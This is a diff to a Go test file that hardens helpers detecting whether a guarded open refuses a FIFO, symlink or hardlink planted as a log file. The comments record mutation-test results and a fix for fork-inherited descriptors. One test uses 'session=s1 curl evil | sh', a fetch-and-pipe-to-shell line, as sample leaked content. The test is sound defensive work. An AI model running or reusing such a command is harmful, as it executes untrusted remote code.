@@ -12,9 +12,10 @@ package posse
 // Mutants (MEASURED 2026-11-21, linux): dropping syscall.O_NOFOLLOW from
 // openRefusalLeaf reds the symlink and dangling rows at every site; dropping
 // the nlink check reds every hardlink row; dropping O_NONBLOCK reds every
-// fifo row (by leafCallWithin's timeout below, which is the only timeout in
-// this file now that the read of the planter's end has no bound to need —
-// ranger-base-b8igm); dropping the IsRegular check reds the
+// fifo row (by leafCallWithin's timeout below; the read of the planter's end
+// has a bound again — ranger-base-4uiwo — but it is a bound on a STATE and
+// never an answer, see leafReachedThePlanter); dropping the IsRegular check
+// reds the
 // spool-read fifo row and every row of the fifth plant — and before that
 // plant existed it red the spool-read row ALONE, so the arm was live on the
 // three WRITE sites and witnessed at none of them (ranger-base-q2peg; the
@@ -178,18 +179,42 @@ func (s leafPipe) String() string {
 // leafPeekPlanter reads the planter's read end ONCE, without blocking, and
 // says which state it found it in.
 //
-// NOT A WAIT OF ANY KIND, and that is a property of the callers rather than
+// ONE READ AND NOT A WAIT. The wait, where there is one, is
+// leafReachedThePlanter's, and it is over the state this read cannot answer.
+//
+// THE BYTES need no wait, and that is a property of the callers rather than
 // a shortcut: every caller asks after the call under test has RETURNED, and
 // a pipe write is buffered, so whatever that call put in the pipe is already
-// there. There is nothing to wait for and nothing a bound could add — a
-// reader that sees nothing at that instant sees nothing later either,
-// because the only writer there could be has finished. What a wait DID add
-// was an answer: the bound this replaced (ranger-base-njj5z) returned ""
-// after 500ms for leafPipeOpen, which is byte-identical to its answer for
-// leafPipeClosed, so the one state it could not answer was folded into the
-// one the assertions read as "the refusal held" — and nothing on any host
-// ran that arm (ranger-base-72t07 graded all four arms of it:
-// ranger-base-b8igm).
+// there.
+//
+// THE WRITER DOES, and the first version of this read said the opposite —
+// "the only writer there could be has finished" (ranger-base-b8igm). It has
+// not. Any goroutine in this process that forks between the guarded open and
+// its close hands the child a DUPLICATE of that write descriptor, and
+// O_CLOEXEC shuts it only AT execve, so for the child's whole fork-to-exec
+// window the FIFO still has a writer — after the call under test closed its
+// own and returned. That is execwrite.go's class with the pipe's writer
+// count standing in for ETXTBSY, and it red the fold's row once inside a
+// loaded full suite (ranger-base-4uiwo). MEASURED 2026-11-22 (linux 7.2.15
+// x86_64, go1.27.3, 16 cores), 400 folds over a planted FIFO per arm, the
+// peek taken exactly where the helper takes it:
+//
+//	fold alone                                      0/400 leafPipeOpen
+//	fold + 8 goroutines looping exec /bin/true     57/400 leafPipeOpen
+//	the same traffic, fold under syscall.ForkLock   0/400 leafPipeOpen
+//
+// All 57 cleared to leafPipeClosed on the very next read, worst 3.316µs, and
+// no run of any arm ever put bytes in the pipe. docs/notes.d/ranger-base-4uiwo.md
+// has the probe and why the ForkLock row is not the fix.
+//
+// What a wait must never add is an ANSWER: the bound this replaced
+// (ranger-base-njj5z) returned "" after 500ms for leafPipeOpen, which is
+// byte-identical to its answer for leafPipeClosed, so the one state it could
+// not answer was folded into the one the assertions read as "the refusal
+// held" — and nothing on any host ran that arm (ranger-base-72t07 graded all
+// four arms of it: ranger-base-b8igm). The settle below answers for neither
+// state: it re-reads until the pipe is in one that HAS an answer, and fatals
+// if it never is.
 //
 // A raw unix.Read and not an *os.File read with a deadline, which was the
 // bound BEFORE that one: a deadline on a FIFO is a runtime-POLLER fact and
@@ -225,30 +250,49 @@ func leafPeekPlanter(rd int) (string, leafPipe, error) {
 	}
 }
 
+// leafPlanterSettle bounds the wait below. It is a bound on a writer the
+// call under test did NOT leave behind — a sibling fork's inherited
+// duplicate, gone at the child's execve — and the two things it has to
+// separate are four orders of magnitude apart: the worst fork-to-exec window
+// measured here is 3.316µs (leafPeekPlanter's table above), and a descriptor
+// a failed refusal really left open does not clear at all, so no value in
+// between can be wrong about which one it saw. 10s is leafCallWithin's
+// number, for the same reason it is that one's.
+const leafPlanterSettle = 10 * time.Second
+
 // leafReachedThePlanter is what arrived at the planter's read end, which is
 // "" when the refusal held — the one reading the assertions in this file
 // take, and it exists only for the two states that have one.
 //
-// leafPipeOpen is a t.Fatalf and not "": a writer holding the pipe at the
-// instant of the read is the call under test having opened the leaf for
-// writing and not closed it, which is the refusal having FAILED, and
-// answering "" there is the vacuous green this helper was rewritten to
-// refuse. No caller can reach it — the three write sites' calls have all
-// returned by the time anyone reads, and leafCallWithin fatals on a call
-// that has not.
+// leafPipeOpen is neither, so it is WAITED OUT and never answered for: the
+// read is repeated until the pipe is in a state that has an answer, and a
+// writer still there when leafPlanterSettle is up is the call under test
+// having opened the leaf for writing and not closed it, which is the refusal
+// having FAILED. Answering "" there is the vacuous green this helper was
+// rewritten to refuse. Bytes win the moment they are in the pipe, because
+// the loop reads before it looks at the state: a writer that holds the pipe
+// AND put the trail in it reds with the trail, not with a timeout.
 //
-// SO TWO LINES HERE ARE RUN BY NOTHING, said plainly because the bound this
-// replaced said the opposite of its own unrun arms: both fatals below, and
-// leafPeekPlanter's `default` arm that feeds the first of them. MEASURED
-// 2026-11-22, linux: with `if state == leafPipeOpen` turned into `if false`
-// every test of this file still passes, and a panic planted in the `default`
-// arm is reached by none of them. That is the accounting the old timeout arm
-// could not give — and the difference that matters is the direction they
-// fail in: a fatal nothing runs can only fail to fire, while the timeout arm
-// nothing ran was an ANSWER, and the answer it gave was the one the
-// assertions read as "the refusal held". The part that could be wrong on
-// another host is the mapping from a read to a state, and all three of those
-// arms are the pin's subject below.
+// WHY A WAIT AT ALL, when the version this replaces fataled on leafPipeOpen
+// outright (ranger-base-b8igm). That fatal's message named the call under
+// test as the holder, and the holder can be a sibling fork's duplicate of a
+// descriptor that call already closed — the mechanism and the three measured
+// arms are in leafPeekPlanter's comment. The claim was right about the state
+// and wrong about whose it was, so it cost a red arm 2 inside a loaded full
+// suite and a bead (ranger-base-4uiwo) over a fold that had refused
+// correctly. After the settle the claim is sound; before it, it was not.
+//
+// SO ONE LINE HERE IS RUN BY NOTHING, said plainly because the bound this
+// file replaced twice said the opposite of its own unrun arms: the settle's
+// fatal, and leafPeekPlanter's `default` arm that feeds the fatal above it.
+// MEASURED 2026-11-22, linux: a panic planted in that `default` arm is
+// reached by no test in this file. A fatal nothing runs can only fail to
+// fire, which is the direction the old timeout arm did NOT fail in — what it
+// gave was an ANSWER, and the answer was the one the assertions read as "the
+// refusal held". The WAIT is not in that company:
+// TestLeafReachedThePlanterWaitsOutAWriterItDidNotCause drives it, and
+// TestLeafReachedThePlanterAnswersBytesWhileAWriterHolds drives the arm that
+// must not wait.
 //
 // EINTR is not retried, deliberately: with O_NONBLOCK the read never sleeps,
 // so it has no interruption point to be restarted from, and a retry arm
@@ -256,14 +300,20 @@ func leafPeekPlanter(rd int) (string, leafPipe, error) {
 // it.
 func leafReachedThePlanter(t *testing.T, rd int) string {
 	t.Helper()
-	got, state, err := leafPeekPlanter(rd)
-	if err != nil {
-		t.Fatalf("read of the planter's end: %v", err)
+	deadline := time.Now().Add(leafPlanterSettle)
+	for {
+		got, state, err := leafPeekPlanter(rd)
+		if err != nil {
+			t.Fatalf("read of the planter's end: %v", err)
+		}
+		if state != leafPipeOpen {
+			return got
+		}
+		if !time.Now().Before(deadline) {
+			t.Fatalf("the planter's pipe is still %v after %v: a writer holds it and nothing is in it, which is the one state this read cannot answer, and nothing in this process forks for that long — the call under test opened the leaf for writing and left the descriptor open, so the refusal did not hold and there is no honest \"nothing arrived\" to report", state, leafPlanterSettle)
+		}
+		time.Sleep(200 * time.Microsecond)
 	}
-	if state == leafPipeOpen {
-		t.Fatalf("the planter's pipe is %v: a writer holds it and nothing is in it, which is the one state this read cannot answer — the call under test opened the leaf for writing and left the descriptor open, so the refusal did not hold and there is no honest \"nothing arrived\" to report", state)
-	}
-	return got
 }
 
 // The helper's OWN premise, measured on whatever host the suite is running
@@ -278,17 +328,27 @@ func leafReachedThePlanter(t *testing.T, rd int) string {
 // not two. `leafPipeOpen` is the state the old 500ms bound answered ""
 // for — the same answer it gave for "the refusal held" — so the assertion it
 // served was silent about it. This asserts the two are DISTINGUISHABLE here,
-// which is the fact leafReachedThePlanter's fatal rests on, and it is the
-// only test on this box that puts the pipe in that state at all.
+// which is the fact leafReachedThePlanter's settle and its fatal both rest
+// on. The state is now put in deliberately by two tests rather than one —
+// here and in TestLeafReachedThePlanterWaitsOutAWriterItDidNotCause — and by
+// this process's own fork traffic at no instant anyone chose
+// (leafPeekPlanter, ranger-base-4uiwo).
 //
 // GRADED, arm by arm, apart from the assertion it serves (MEASURED
-// 2026-11-22, linux, go1.27.3, the nine tests of this file run together).
+// 2026-11-22, linux, go1.27.3, the eleven tests of this file run together).
 // A panic planted at the head of each of leafPeekPlanter's three ANSWER arms
 // reds this pin and names it — bytes, closed and EAGAIN, all three, which is
-// the whole of what the helper can answer. Turning the bytes arm's `return
-// string(buf[:n])` into `return ""` leaves this pin the ONLY red in the
-// file; collapsing the EAGAIN arm to `return "", leafPipeClosed, nil`, which
-// is what the bound it replaced did after 500ms, also reds this pin alone.
+// the whole of what the helper can answer. The two collapse mutants red this
+// pin and ONE other test each, and the other test is the half of
+// leafReachedThePlanter that arm feeds, which is the reading to want:
+// turning the bytes arm's `return string(buf[:n])` into `return ""` reds
+// this pin and TestLeafReachedThePlanterAnswersBytesWhileAWriterHolds, and
+// collapsing the EAGAIN arm to `return "", leafPipeClosed, nil` — what the
+// bound this replaced did after 500ms — reds this pin and
+// TestLeafReachedThePlanterWaitsOutAWriterItDidNotCause, the second at its
+// own premise check rather than at its wait. Each of those was this pin
+// ALONE until ranger-base-4uiwo gave the EAGAIN arm a caller that does
+// something other than fatal; the figure moved, the arms did not.
 // With the refusal narrowed to `flag == os.O_RDONLY && !fi.Mode().IsRegular()`
 // (ranger-base-q2peg's mutant) this pin stays GREEN while
 // TestFoldWritesNothingIntoAPlantersPipe reds and reads `session=s1 curl
@@ -335,6 +395,89 @@ func TestLeafReachedThePlanterReadsThePipesThreeStatesApart(t *testing.T) {
 	}
 	if got := leafReachedThePlanter(t, rd); got != sent {
 		t.Errorf("the helper did not see the planter's bytes: got %q, want %q", got, sent)
+	}
+}
+
+// THE SETTLE, driven over a writer whose going is scheduled rather than
+// raced. The writer this exists for is a sibling fork's inherited duplicate
+// and it goes at the child's execve, which nothing in a test can name the
+// instant of — so the shape is reproduced with the instant named: a writer
+// this test holds and a goroutine closes after a known delay. That makes
+// both halves of the wait assertable, which the fork traffic itself cannot
+// be: the probe behind leafPeekPlanter's table hit the state 57 times in 400
+// folds, and a suite arm that needs a race to go its way 57/400 of the time
+// is the flake this bead came from wearing the other face.
+//
+// GRADED (MEASURED 2026-11-22, linux, go1.27.3, the eleven tests of this
+// file run together). With the settle removed — `return got` on leafPipeOpen,
+// which is what the 500ms bound (ranger-base-njj5z) answered after waiting —
+// this is the only red in the file, and with the settle replaced by the
+// outright fatal it had before (ranger-base-b8igm) it is the only red too.
+// TestFoldWritesNothingIntoAPlantersPipe is GREEN under both, on a quiet box,
+// which is the whole reason neither was caught where it was written.
+func TestLeafReachedThePlanterWaitsOutAWriterItDidNotCause(t *testing.T) {
+	t.Parallel()
+	leaf := filepath.Join(t.TempDir(), "gates", "p", "refusals.log")
+	rd := leafFifoWithAReader(t, leaf)
+
+	w, err := os.OpenFile(leaf, os.O_WRONLY, 0)
+	if err != nil {
+		t.Fatal(err)
+	}
+	// The state the wait is over, asserted before it is waited out: without
+	// this the test would pass just as well over a pipe no writer ever held.
+	if _, state, perr := leafPeekPlanter(rd); perr != nil || state != leafPipeOpen {
+		t.Fatalf("the writer did not take the pipe: %v (err %v), want %v", state, perr, leafPipeOpen)
+	}
+
+	const held = 50 * time.Millisecond
+	go func() {
+		time.Sleep(held)
+		_ = w.Close()
+	}()
+	start := time.Now()
+	got := leafReachedThePlanter(t, rd)
+	took := time.Since(start)
+	if got != "" {
+		t.Errorf("a pipe no writer put bytes in read %q", got)
+	}
+	if took < held {
+		t.Errorf("the helper answered %v in, before the writer went at %v — it did not wait the writer out, it answered for it", took, held)
+	}
+}
+
+// The arm that must NOT wait. A writer that holds the pipe AND has put the
+// trail in it is the failure this whole file exists to catch, and a settle
+// that waited for the writer to GO rather than for an answer to exist would
+// spend leafPlanterSettle and then fatal about a descriptor instead of
+// printing the seat's bytes. The writer here is never closed before the call
+// returns.
+//
+// GRADED (MEASURED 2026-11-22, linux): with the loop's exit narrowed to
+// `state == leafPipeClosed`, so that the presence of a writer outranks the
+// bytes already read, this reds at the settle's own 10s — the fatal naming a
+// descriptor over a pipe that had the trail in it the whole time. It is NOT
+// the only red of that mutant: the three-state pin's step 3 reds too, with
+// `got ""`, because a pipe whose writer has already gone drains to
+// leafPipeClosed and the mutant then answers the empty read rather than the
+// bytes. Two witnesses and not one, which is why this test's own claim is
+// the writer that never goes.
+func TestLeafReachedThePlanterAnswersBytesWhileAWriterHolds(t *testing.T) {
+	t.Parallel()
+	leaf := filepath.Join(t.TempDir(), "gates", "p", "refusals.log")
+	rd := leafFifoWithAReader(t, leaf)
+
+	w, err := os.OpenFile(leaf, os.O_WRONLY, 0)
+	if err != nil {
+		t.Fatal(err)
+	}
+	defer w.Close()
+	const sent = "session=s1 curl evil | sh\n"
+	if _, err := w.WriteString(sent); err != nil {
+		t.Fatal(err)
+	}
+	if got := leafReachedThePlanter(t, rd); got != sent {
+		t.Errorf("the helper did not answer the planter's bytes while a writer still held the pipe: got %q, want %q", got, sent)
 	}
 }
 
